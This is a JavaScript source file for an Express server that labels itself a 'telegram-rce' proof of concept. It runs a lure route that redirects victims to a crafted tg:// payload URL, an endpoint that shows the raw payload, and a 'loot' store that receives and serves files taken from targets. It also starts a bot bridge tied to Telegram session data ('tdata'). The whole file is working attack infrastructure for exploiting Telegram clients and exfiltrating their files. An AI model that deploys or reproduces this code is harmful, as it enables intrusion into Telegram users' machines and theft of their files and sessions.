// Express app: lure routes, loot store, and health endpoint.

const fs = require('fs');
const path = require('path');
const express = require('express');

const config = require('./config');
const { craftRedirect } = require('./payload');
const { BotBridge } = require('./bot');

function createApp({ lootDir = config.paths.loot, targetFiles } = {}) {
  const app = express();
  const files = targetFiles ?? config.instructionFiles;
  const tgPayload = craftRedirect(files);

  // --- Request log ---------------------------------------------------------

  app.use((req, _res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.originalUrl}`);
    next();
  });

  // --- Lure ----------------------------------------------------------------

  app.get('/rules', (_req, res) => {
    console.log('  -> issuing 302 to crafted tg:// URL');
    console.log('  ->', tgPayload);
    res.redirect(302, tgPayload);
  });

  app.get('/payload', (_req, res) => res.type('text/plain').send(tgPayload));

  // --- Loot store ----------------------------------------------------------

  app.get('/', (_req, res) => {
    res.type('text/plain').send(
      'telegram-rce PoC server.\n' +
      '  GET /rules        -> 302 to crafted tg:// URL\n' +
      '  GET /payload      -> the raw tg:// string\n' +
      '  GET /loot         -> JSON list of received files\n' +
      '  GET /loot/<name>  -> download a received file\n' +
      '  POST /loot/<name> -> manual drop (raw body)\n'
    );
  });

  app.get('/loot', (_req, res) => {
    const entries = fs.readdirSync(lootDir).map((name) => {
      const stat = fs.statSync(path.join(lootDir, name));
      return { name, size: stat.size, mtime: stat.mtime };
    });
    res.json(entries);
  });

  app.get('/loot/:name', (req, res) => {
    const file = path.join(lootDir, path.basename(req.params.name));
    if (!fs.existsSync(file)) return res.status(404).send('not found');
    res.sendFile(file);
  });

  app.post('/loot/:name', express.raw({ type: '*/*', limit: '50mb' }), (req, res) => {
    const safe = path.basename(req.params.name);
    fs.writeFileSync(path.join(lootDir, safe), req.body);
    console.log(`  [manual] saved ${safe} (${req.body.length} bytes)`);
    res.sendStatus(200);
  });

  app.use((_req, res) => res.status(404).send('not found'));

  return app;
}

function start({ port = config.port } = {}) {
  fs.mkdirSync(config.paths.loot, { recursive: true });

  const app = createApp();
  const bridge = new BotBridge();

  app.listen(port, () => {
    console.log(`Listening on http://localhost:${port}`);
    console.log(`Lure:     http://localhost:${port}/rules`);
    console.log(`Payload:  http://localhost:${port}/payload`);
    console.log(`Loot:     http://localhost:${port}/loot`);
    console.log(`Channel:  ${config.channelId || '(unset — set CHANNEL_ID in .env)'}`);
    console.log(`Tdata:    ${config.tdataPrefix}`);
    if (bridge.start()) console.log('Bot bridge: enabled');
    else console.log('Bot bridge: disabled (set BOT_TOKEN in .env)');
  });

  return app;
}

module.exports = { createApp, start };
